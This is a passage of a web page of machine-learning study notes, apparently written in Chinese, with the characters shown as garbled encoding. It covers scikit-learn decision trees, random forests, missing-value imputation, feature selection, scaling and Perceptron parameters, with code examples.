·æœ¬é‡å˜åŒ–å¾ˆå¤§ï¼Œå»ºè®®è¾“å…¥æµ®ç‚¹æ•°ä½œä¸ºæ ·æœ¬é‡çš„ç™¾åˆ†æ¯”æ¥ä½¿ç”¨ã€‚åŒæ—¶ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥ä¿è¯æ¯ä¸ªå¶å­çš„æœ€å°å°ºå¯¸ï¼Œå¯ä»¥åœ¨å›å½’é—®é¢˜ä¸­é¿å…ä½æ–¹å·®ï¼Œè¿‡æ‹Ÿåˆçš„å¶å­èŠ‚ç‚¹å‡ºç°ã€‚å¯¹äºç±»åˆ«ä¸å¤šçš„åˆ†ç±»é—®é¢˜ï¼Œ&#x3D;1é€šå¸¸å°±æ˜¯æœ€ä½³é€‰æ‹©ã€‚</p><p>min_samples_splité™å®šï¼Œä¸€ä¸ªèŠ‚ç‚¹å¿…é¡»è¦åŒ…å«è‡³å°‘min_samples_splitä¸ªè®­ç»ƒæ ·æœ¬ï¼Œè¿™ä¸ªèŠ‚ç‚¹æ‰å…è®¸è¢«åˆ†æï¼Œå¦åˆ™åˆ†æå°±ä¸ä¼šå‘ç”Ÿã€‚</p></li></ul><h3><span id="å›å½’æ ‘">å›å½’æ ‘</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeRegressor</span><br><span class="line">regr_1 = DecisionTreeRegressor(max_depth=<span class="number">2</span>)</span><br><span class="line">regr_1.fit(X, y)</span><br><span class="line">y_1 = regr_1.predict(X_test)</span><br></pre></td></tr></table></figure><h3><span id="éšæœºæ£®æ—">éšæœºæ£®æ—</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line">wine = load_wine()</span><br><span class="line">wine.data</span><br><span class="line">wine.target</span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(wine.data,wine.target,test_size=<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clf = DecisionTreeClassifier(random_state=0)</span></span><br><span class="line">rfc = RandomForestClassifier(random_state=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#clf = clf.fit(Xtrain,Ytrain)</span></span><br><span class="line">rfc = rfc.fit(Xtrain,Ytrain)</span><br><span class="line"><span class="comment">#score_c = clf.score(Xtest,Ytest)</span></span><br><span class="line">score_r = rfc.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#äº¤å‰éªŒè¯ï¼šæ˜¯æ•°æ®é›†åˆ’åˆ†ä¸ºnåˆ†ï¼Œä¾æ¬¡å–æ¯ä¸€ä»½åšæµ‹è¯•é›†ï¼Œæ¯n-1ä»½åšè®­ç»ƒé›†ï¼Œå¤šæ¬¡è®­ç»ƒæ¨¡å‹ä»¥è§‚æµ‹æ¨¡å‹ç¨³å®šæ€§çš„æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">rfc_l = []</span><br><span class="line">clf_l = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    rfc = RandomForestClassifier(n_estimators=<span class="number">25</span>)</span><br><span class="line">    rfc_s = cross_val_score(rfc,wine.data,wine.target,cv=<span class="number">10</span>).mean()</span><br><span class="line">    rfc_l.append(rfc_s)</span><br><span class="line">    clf = DecisionTreeClassifier()</span><br><span class="line">    clf_s = cross_val_score(clf,wine.data,wine.target,cv=<span class="number">10</span>).mean()</span><br><span class="line">    clf_l.append(clf_s)</span><br><span class="line">    </span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>),rfc_l,label = <span class="string">&quot;Random Forest&quot;</span>)</span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>),clf_l,label = <span class="string">&quot;Decision Tree&quot;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ˜¯å¦æœ‰æ³¨æ„åˆ°ï¼Œå•ä¸ªå†³ç­–æ ‘çš„æ³¢åŠ¨è½¨è¿¹å’Œéšæœºæ£®æ—ä¸€è‡´ï¼Ÿ</span></span><br><span class="line"><span class="comment">#å†æ¬¡éªŒè¯äº†æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ï¼Œå•ä¸ªå†³ç­–æ ‘çš„å‡†ç¡®ç‡è¶Šé«˜ï¼Œéšæœºæ£®æ—çš„å‡†ç¡®ç‡ä¹Ÿä¼šè¶Šé«˜</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>éšæœºæ£®æ—å¡«å……æ•°æ®</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">X_missing_reg = X_missing.copy()</span><br><span class="line">sortindex = np.argsort(X_missing_reg.isnull().<span class="built_in">sum</span>(axis=<span class="number">0</span>)).values</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sortindex:</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#æ„å»ºæˆ‘ä»¬çš„æ–°ç‰¹å¾çŸ©é˜µå’Œæ–°æ ‡ç­¾</span></span><br><span class="line"> Â  Â df = X_missing_reg</span><br><span class="line"> Â  Â fillc = df.iloc[:,i]</span><br><span class="line"> Â  Â df = pd.concat([df.iloc[:,df.columns != i],pd.DataFrame(y_full)],axis=<span class="number">1</span>)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#åœ¨æ–°ç‰¹å¾çŸ©é˜µä¸­ï¼Œå¯¹å«æœ‰ç¼ºå¤±å€¼çš„åˆ—ï¼Œè¿›è¡Œ0çš„å¡«è¡¥</span></span><br><span class="line"> Â  Â df_0 =SimpleImputer(missing_values=np.nan,</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â strategy=<span class="string">&#x27;constant&#x27;</span>,fill_value=<span class="number">0</span>).fit_transform(df)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#æ‰¾å‡ºæˆ‘ä»¬çš„è®­ç»ƒé›†å’Œæµ‹è¯•é›†</span></span><br><span class="line"> Â  Â Ytrain = fillc[fillc.notnull()]</span><br><span class="line"> Â  Â Ytest = fillc[fillc.isnull()]</span><br><span class="line"> Â  Â Xtrain = df_0[Ytrain.index,:]</span><br><span class="line"> Â  Â Xtest = df_0[Ytest.index,:]</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#ç”¨éšæœºæ£®æ—å›å½’æ¥å¡«è¡¥ç¼ºå¤±å€¼</span></span><br><span class="line"> Â  Â rfc = RandomForestRegressor(n_estimators=<span class="number">100</span>)</span><br><span class="line"> Â  Â rfc = rfc.fit(Xtrain, Ytrain)</span><br><span class="line"> Â  Â Ypredict = rfc.predict(Xtest)</span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="comment">#å°†å¡«è¡¥å¥½çš„ç‰¹å¾è¿”å›åˆ°æˆ‘ä»¬çš„åŸå§‹çš„ç‰¹å¾çŸ©é˜µä¸­</span></span><br><span class="line">    X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),X_missing_reg.columns[i]] = Ypredict</span><br><span class="line"> Â  Â <span class="comment"># X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),i] = Ypredict å¯èƒ½æŠ¥é”™</span></span><br></pre></td></tr></table></figure><h3><span id="é¢„å¤„ç†">é¢„å¤„ç†</span></h3><h4><span id="æ–¹å·®è¿‡æ»¤"><strong>æ–¹å·®è¿‡æ»¤</strong></span></h4><p>æ¯”å¦‚ä¸€ä¸ªç‰¹å¾æœ¬èº«çš„æ–¹å·®å¾ˆå°ï¼Œå°±è¡¨ç¤ºæ ·æœ¬åœ¨è¿™ä¸ªç‰¹å¾ä¸ŠåŸºæœ¬æ²¡æœ‰å·®å¼‚ï¼Œå¯èƒ½ç‰¹å¾ä¸­çš„å¤§å¤šæ•°å€¼éƒ½ä¸€æ ·ï¼Œç”šè‡³æ•´ä¸ªç‰¹å¾çš„å–å€¼éƒ½ç›¸åŒï¼Œé‚£è¿™ä¸ªç‰¹å¾å¯¹äºæ ·æœ¬åŒºåˆ†æ²¡æœ‰ä»€ä¹ˆä½œç”¨<strong>æ‰€ä»¥æ— è®ºæ¥ä¸‹æ¥çš„ç‰¹å¾å·¥ç¨‹è¦åšä»€ä¹ˆï¼Œéƒ½è¦ä¼˜å…ˆæ¶ˆé™¤æ–¹å·®ä¸º0çš„ç‰¹å¾</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> VarianceThreshold</span><br><span class="line">selector = VarianceThreshold() <span class="comment">#å®ä¾‹åŒ–ï¼Œä¸å¡«å‚æ•°é»˜è®¤æ–¹å·®ä¸º0</span></span><br><span class="line">X_var0 = selector.fit_transform(X) <span class="comment">#è·å–åˆ é™¤ä¸åˆæ ¼ç‰¹å¾ä¹‹åçš„æ–°ç‰¹å¾çŸ©é˜µ</span></span><br><span class="line"><span class="comment"># è¿‡æ»¤ä¸€åŠçš„å˜é‡</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">X_fsvar = VarianceThreshold(np.median(X.var().values)).fit_transform(X) X.var().values</span><br><span class="line">np.median(X.var().values)</span><br></pre></td></tr></table></figure><h4><span id="å¡æ–¹è¿‡æ»¤">å¡æ–¹è¿‡æ»¤</span></h4><p>ä¸“é—¨é’ˆå¯¹ç¦»æ•£å‹æ ‡ç­¾ï¼ˆå³åˆ†ç±»é—®é¢˜ï¼‰çš„ç›¸å…³æ€§è¿‡æ»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier <span class="keyword">as</span> RFC</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> SelectKBest</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> chi2</span><br><span class="line"><span class="comment">#å‡è®¾åœ¨è¿™é‡Œæˆ‘ä¸€ç›´æˆ‘éœ€è¦300ä¸ªç‰¹å¾</span></span><br><span class="line">X_fschi = SelectKBest(chi2, k=<span class="number">300</span>).fit_transform(X_fsvar, y)</span><br><span class="line">X_fschi.shape</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fschi,y,cv=<span class="number">5</span>).mean()</span><br><span class="line"></span><br><span class="line">chivalue, pvalues_chi = chi2(X_fsvar,y)</span><br><span class="line"><span class="comment">#kå–å¤šå°‘ï¼Ÿæˆ‘ä»¬æƒ³è¦æ¶ˆé™¤æ‰€æœ‰på€¼å¤§äºè®¾å®šå€¼ï¼Œæ¯”å¦‚0.05æˆ–0.01çš„ç‰¹å¾ï¼š</span></span><br><span class="line">k = chivalue.shape[<span class="number">0</span>] - (pvalues_chi &gt; <span class="number">0.05</span>).<span class="built_in">sum</span>()</span><br><span class="line">X_fschi = SelectKBest(chi2, k=å¡«å†™å…·ä½“çš„k).fit_transform(X_fsvar, y)</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fschi,y,cv=<span class="number">5</span>).mean()</span><br></pre></td></tr></table></figure><h4><span id="fæ£€éªŒåªèƒ½æ£€éªŒçº¿æ€§å…³ç³»">Fæ£€éªŒï¼ˆåªèƒ½æ£€éªŒçº¿æ€§å…³ç³»ï¼‰</span></h4><p>å®ƒå³å¯ä»¥åšå›å½’ä¹Ÿå¯ä»¥åšåˆ†ç±»ï¼Œå› æ­¤åŒ…å«<strong>feature_selection.f_classif</strong>ï¼ˆFæ£€éªŒåˆ†ç±»ï¼‰å’Œ<strong>feature_selection.f_regression</strong>ï¼ˆFæ£€éªŒå›</p><p>å½’ï¼‰ä¸¤ä¸ªç±»ã€‚å…¶ä¸­Fæ£€éªŒåˆ†ç±»ç”¨äºæ ‡ç­¾æ˜¯ç¦»æ•£å‹å˜é‡çš„æ•°æ®ï¼Œè€ŒFæ£€éªŒå›å½’ç”¨äºæ ‡ç­¾æ˜¯è¿ç»­å‹å˜é‡çš„æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> f_classif</span><br><span class="line">F, pvalues_f = f_classif(X_fsvar,y) </span><br><span class="line">k = F.shape[<span class="number">0</span>] - (pvalues_f &gt; <span class="number">0.05</span>).<span class="built_in">sum</span>()</span><br><span class="line">X_fsF = SelectKBest(f_classif, k=å¡«å†™å…·ä½“çš„k).fit_transform(X_fsvar, y)</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fsF,y,cv=<span class="number">5</span>).mean()</span><br></pre></td></tr></table></figure><h4><span id="äº’ä¿¡æ¯æ³•">äº’ä¿¡æ¯æ³•</span></h4><h3><span id="ç‰¹å¾å·¥ç¨‹">ç‰¹å¾å·¥ç¨‹</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Normalization å½’ä¸€åŒ– ä¸€èˆ¬æ¥è¯´å°†æ•°æ®åˆ†éƒ¨åœ¨0åˆ°1ä¹‹é—´</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line">data = [[-<span class="number">1</span>, <span class="number">2</span>], [-<span class="number">0.5</span>, <span class="number">6</span>], [<span class="number">0</span>, <span class="number">10</span>], [<span class="number">1</span>, <span class="number">18</span>]]</span><br><span class="line">scaler = MinMaxScaler()</span><br><span class="line"><span class="comment"># scaler = MinMaxScaler(feature_range=[5,10])</span></span><br><span class="line">result_ = scaler.fit_transform(data) <span class="comment">#è®­ç»ƒå’Œå¯¼å‡ºç»“æœä¸€æ­¥è¾¾æˆ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sklearn é‡Œé¢å¤„ç†æ ‡å‡†åŒ–è¿™äº›éœ€è¦äºŒç»´æ•°ç»„</span></span><br><span class="line"><span class="comment"># Standardization æ ‡å‡†åŒ– å°†æ•°æ®å¤„ç†æˆæ ‡å‡†æ­£æ€åˆ†å¸ƒå½¢å¼</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">data = [[-<span class="number">1</span>, <span class="number">2</span>], [-<span class="number">0.5</span>, <span class="number">6</span>], [<span class="number">0</span>, <span class="number">10</span>], [<span class="number">1</span>, <span class="number">18</span>]]</span><br><span class="line">scaler = StandardScaler() <span class="comment">#å®ä¾‹åŒ–</span></span><br><span class="line">res = scaler.fit_transform(data) <span class="comment">#ä½¿ç”¨fit_transform(data)ä¸€æ­¥è¾¾æˆç»“æœ</span></span><br><span class="line">res.mean()</span><br><span class="line">res.std()</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®é¢„å¤„ç†">æ•°æ®é¢„å¤„ç†</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sklearn é‡Œé¢å¤„ç†æ ‡å‡†åŒ–è¿™äº›éœ€è¦äºŒç»´æ•°ç»„</span></span><br><span class="line">shape(-<span class="number">1</span>,<span class="number">1</span>) <span class="comment"># å˜æˆä¸€åˆ—</span></span><br><span class="line">shape(<span class="number">1</span>,-<span class="number">1</span>) <span class="comment"># å˜æˆä¸€è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœæ•°æ®è‡ªå¸¦ç´¢å¼•ï¼Œå¯¼å…¥æ—¶éœ€æŒ‡å®šç´¢å¼•åˆ—</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">r&quot;C:\work\learnbetter\micro-class\week 3 Preprocessing\Narrativedata.csv&quot;</span>,index_col=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼ºå¤±æ•°æ®å¤„ç†</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">r&quot;C:\work\learnbetter\micro-class\week 3 </span></span><br><span class="line"><span class="string">Preprocessing\Narrativedata.csv&quot;</span>,index_col=<span class="number">0</span>)</span><br><span class="line">data.head()</span><br><span class="line">data.loc[:,<span class="string">&quot;Age&quot;</span>] = data.loc[:,<span class="string">&quot;Age&quot;</span>].fillna(data.loc[:,<span class="string">&quot;Age&quot;</span>].median())</span><br><span class="line"><span class="comment">#.fillna åœ¨DataFrameé‡Œé¢ç›´æ¥è¿›è¡Œå¡«è¡¥</span></span><br><span class="line">data.dropna(axis=<span class="number">0</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#.dropna(axis=0)åˆ é™¤æ‰€æœ‰æœ‰ç¼ºå¤±å€¼çš„è¡Œï¼Œ.dropna(axis=1)åˆ é™¤æ‰€æœ‰æœ‰ç¼ºå¤±å€¼çš„åˆ—</span></span><br><span class="line"><span class="comment">#å‚æ•°inplaceï¼Œä¸ºTrueè¡¨ç¤ºåœ¨åŸæ•°æ®é›†ä¸Šè¿›è¡Œä¿®æ”¹ï¼Œä¸ºFalseè¡¨ç¤ºç”Ÿæˆä¸€ä¸ªå¤åˆ¶å¯¹è±¡ï¼Œä¸ä¿®æ”¹åŸæ•°æ®ï¼Œé»˜è®¤False</span></span><br><span class="line">                   </span><br><span class="line">                   </span><br><span class="line"><span class="comment"># sklearnåªèƒ½å¤„ç†æ•°å€¼å‹æ•°æ®ï¼Œå› æ­¤è¦å°†æ ‡ç­¾è½¬ä¸ºæ•°æ®</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line">y = data.iloc[:,-<span class="number">1</span>] <span class="comment">#è¦è¾“å…¥çš„æ˜¯æ ‡ç­¾ï¼Œä¸æ˜¯ç‰¹å¾çŸ©é˜µï¼Œæ‰€ä»¥å…è®¸ä¸€ç»´</span></span><br><span class="line">le = LabelEncoder() <span class="comment">#å®ä¾‹åŒ–</span></span><br><span class="line">label=le.fit_transform(y)</span><br><span class="line">data.iloc[:,-<span class="number">1</span>] = label <span class="comment">#è®©æ ‡ç­¾ç­‰äºæˆ‘ä»¬è¿è¡Œå‡ºæ¥çš„ç»“æœ</span></span><br><span class="line">                   </span><br><span class="line">                  </span><br></pre></td></tr></table></figure><h3><span id="é€»è¾‘å›å½’">é€»è¾‘å›å½’</span></h3><h3><span id="perceptrons">Perceptrons</span></h3><table><thead><tr><th>å‚æ•°åç§°</th><th>å‚æ•°å–å€¼</th><th>å‚æ•°è§£é‡Š</th></tr></thead><tbody><tr><td>penalty</td><td>é»˜è®¤&#x3D;Noneï¼Œå³ä¸åŠ æƒ©ç½šé¡¹ï¼Œâ€˜l2â€™ï¼ˆL2æ­£åˆ™ï¼‰ or â€˜l1â€™ï¼ˆL1æ­£åˆ™ï¼‰ or â€˜elasticnetâ€™ï¼ˆæ··åˆæ­£åˆ™ï¼‰</td><td>æƒ©ç½šé¡¹ï¼ŒåŠ ä¸Šæƒ©ç½šé¡¹ä¸»è¦ä¸ºäº†é¿å…æ¨¡å‹è¿‡æ‹Ÿåˆé£é™©</td></tr><tr><td>alpha</td><td>é»˜è®¤&#x3D;0.0001ï¼Œå–å€¼ä¸ºæµ®ç‚¹æ•°</td><td>å¦‚æœpenaltyä¸ä¸ºNoneï¼Œåˆ™æ­£åˆ™åŒ–é¡¹éœ€è¦ä¹˜ä¸Šè¿™ä¸ªæ•°</td></tr><tr><td>l1_ratio</td><td>é»˜è®¤&#x3D;0.15ï¼Œå–å€¼åœ¨[0,1]</td><td>ä¸€èˆ¬åªåœ¨penalty&#x3D;elasticnetæ—¶ç”¨ï¼Œå½“l1_ratio &#x3D;0å°±æ˜¯L2æ­£åˆ™ï¼Œå½“l1_ratio &#x3D;1å°±æ˜¯L1æ­£åˆ™ï¼Œå½“åœ¨(0,1)ä¹‹é—´å°±æ˜¯æ··åˆæ­£åˆ™</td></tr><tr><td>fit_intercept</td><td>boolå€¼ï¼Œé»˜è®¤&#x3D;True</td><td>æ˜¯å¦å¯¹å‚æ•° æˆªè·é¡¹bè¿›è¡Œä¼°è®¡ï¼Œè‹¥ä¸ºFalseåˆ™æ•°æ®åº”æ˜¯ä¸­å¿ƒåŒ–çš„</td></tr><tr><td>max_iter</td><td>intæ•´æ•°ï¼Œé»˜è®¤&#x3D;1000</td><td>æœ€å¤§è¿­ä»£æ¬¡æ•°ï¼Œå“ªæ€•æŸå¤±å‡½æ•°ä¾æ—§å¤§äº0&#x2F;</td></tr><tr><td>tol</td><td>float or Noneï¼Œé»˜è®¤&#x3D;10^(-3)</td><td>è¿­ä»£åœæ­¢çš„æ ‡å‡†ã€‚å¦‚æœä¸ä¸ºNoneï¼Œé‚£ä¹ˆå½“loss-pre-loss&lt;tolçš„æ—¶å€™ï¼Œå°±ä¼šåœæ­¢è¿­ä»£ã€‚å› ä¸ºå½“å‰è¿­ä»£é€ æˆçš„æŸå¤±å‡½æ•°ä¸‹é™å¤ªå°äº†ï¼Œè¿­ä»£ä¸‹å»å¯¹losså½±å“ä¸å¤§äº†ã€‚</td></tr><tr><td>shuffle</td><td>boolå€¼ï¼Œé»˜è®¤&#x3D;True</td><td>æ¯è½®è®­ç»ƒåæ˜¯å¦æ‰“ä¹±æ•°æ®</td></tr><tr><td>verbose</td><td>å–å€¼ä¸ºæ•´æ•°ï¼Œé»˜è®¤&#x3D;0</td><td>verbose &#x3D; 0 ä¸ºä¸åœ¨æ ‡å‡†è¾“å‡ºæµè¾“å‡ºæ—¥å¿—ä¿¡æ¯ï¼Œverbose &#x3D; 1 ä¸ºè¾“å‡ºè¿›åº¦æ¡è®°å½•ï¼›verbose &#x3D; 2 ä¸ºæ¯ä¸ªepochè¾“å‡ºä¸€è¡Œè®°å½•</td></tr><tr><td>eta0</td><td>å–å€¼åŒç²¾åº¦æµ®ç‚¹å‹doubleï¼Œé»˜è®¤&#x3D;1</td><td>å­¦ä¹ ç‡ï¼Œå†³å®šæ¢¯åº¦ä¸‹é™æ—¶æ¯æ¬¡å‚æ•°å˜åŒ–çš„å¹…åº¦</td></tr><tr><td>n_jobs</td><td>å–å€¼ä¸º int or Noneï¼Œé»˜è®¤&#x3D;None</td><td>åœ¨å¤šåˆ†ç±»æ—¶ä½¿ç”¨çš„CPUæ•°é‡ï¼Œé»˜è®¤ä¸ºNoneï¼ˆæˆ–1ï¼‰ï¼Œè‹¥ä¸º-1åˆ™ä½¿ç”¨æ‰€æœ‰CPU</td></tr><tr><td>random_state</td><td>å–å€¼ä¸ºint, RandomState instance or Noneï¼Œé»˜è®¤&#x3D;None</td><td>å½“ shuffle &#x3D;Trueæ—¶ï¼Œç”¨äºæ‰“ä¹±è®­ç»ƒæ•°æ®</td></tr><tr><td>n_iter_no_change</td><td>å–å€¼intï¼Œé»˜è®¤&#x3D;5</td><td>åœ¨æå‰åœæ­¢ä¹‹å‰ç­‰å¾…éªŒè¯åˆ†æ•°æ— æ”¹è¿›çš„è¿­ä»£æ¬¡æ•°ï¼Œç”¨äºæå‰åœæ­¢è¿­ä»£</td></tr><tr><td>early_stopping</td><td>å–å€¼boolå€¼ï¼Œé»˜è®¤&#x3D;False</td><td>å½“éªŒè¯å¾—åˆ†ä¸å†æé«˜æ—¶æ˜¯å¦è®¾ç½®æå‰åœæ­¢æ¥ç»ˆæ­¢è®­ç»ƒã€‚è‹¥è®¾ç½®æ­¤é¡¹ï¼Œå½“éªŒè¯å¾—åˆ†åœ¨n_iter_no_changeè½®å†…æ²¡æœ‰æå‡æ—¶æå‰åœæ­¢è®­ç»ƒ</td></tr><tr><td>class_weight</td><td>å–å€¼ä¸ºdict, {class_label: weight} æˆ–è€… â€œbalancedâ€æˆ–è€…Noneï¼Œé»˜è®¤&#x3D;None</td><td>ç”¨äºæ‹Ÿåˆå‚æ•°æ—¶ï¼Œæ¯ä¸€ç±»çš„æƒé‡æ˜¯å¤šå°‘ã€‚å½“ä¸ºNoneæ—¶ï¼Œæ‰€æœ‰ç±»çš„æƒé‡ä¸º1ï¼Œç­‰æƒé‡ï¼›å½“ä¸ºbalancedæ—¶ï¼ŒæŸç±»çš„æƒé‡ä¸ºè¯¥ç±»é¢‘æ•°çš„åæ¯”ï¼Œå½“ä¸ºå­—å…¸æ—¶ï¼Œåˆ™keyä¸ºç±»çš„æ ‡ç­¾ï¼Œå€¼ä¸ºå¯¹åº”çš„æƒé‡</td></tr><tr><td>warm_start</td><td>å–å€¼ä¸ºboolï¼Œé»˜è®¤&#x3D;False</td><td>è‹¥ä¸ºTrueåˆ™è°ƒç”¨å‰ä¸€æ¬¡è®¾ç½®çš„å‚æ•°ï¼Œä½¿ç”¨æ–°è®¾ç½®çš„å‚æ•°</td></tr></tbody></table><ul><li><p>eta0 å­¦ä¹ ç‡</p><p>ç±»ä¼¼äºæ­¥é•¿ï¼Œæ­¥é•¿å¤ªå°æ”¶æ•›å¤ªæ…¢ï¼Œæ­¥é•¿å¤ªé•¿ï¼Œåå¤æ¨ªè·³ï¼Œæ— æ³•æ”¶æ•›ã€‚</p></li></ul><h3><span 